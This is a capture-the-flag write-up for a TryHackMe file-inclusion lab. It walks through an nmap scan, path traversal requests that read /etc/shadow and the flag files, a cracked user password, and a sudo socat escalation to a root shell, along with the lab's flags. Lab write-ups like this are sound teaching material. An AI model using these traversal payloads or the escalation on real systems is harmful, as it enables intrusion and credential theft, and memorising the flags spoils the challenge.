###### A beginner level LFI challenge
Room: https://tryhackme.com/room/inclusion
##


**sudo nmap** -sS -sV -T5 -vv xx.xx.xxx.xxx  
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If we go to the website and click any of the articles, we see that the url changes to **/article?name=ARTICLE_Name_here**.  
We can abuse this by trying to read from an arbitrary file. If we replace article name with a desired file location, we can access its content.  

**http://xx.xx.xxx.xxx/article?name=../../../etc/shadow**
```
<!DOCTYPE html>

<html>
    <body>
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18281:0:99999:7:::
uuidd:*:18281:0:99999:7:::
dnsmasq:*:18281:0:99999:7:::
landscape:*:18281:0:99999:7:::
pollinate:*:18281:0:99999:7:::
falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
sshd:*:18281:0:99999:7:::
mysql:!:18281:0:99999:7:::
    </body>

</html>
```

But... why cracking the hash when we can access the /home/falconfeast/user.txt and /root/root.txt the same way as shown before?  
**http://xx.xx.xxx.xxx/article?name=../../../home/falconfeast/user.txt**  **[Flag 1]**
```
60989655118397345799 
```
**http://xx.xx.xxx.xxx/article?name=../../../root/root.txt**  **[Flag 2]**
```
42964104845495153909
```

Anyway, after cracking the hash, the password for falconfeast is **rootpassword**.   

**falconfeast@inclusion:~$ sudo -l**  

```
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```
 **sudo socat stdin exec:/bin/sh**
```
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
whoami
root
```
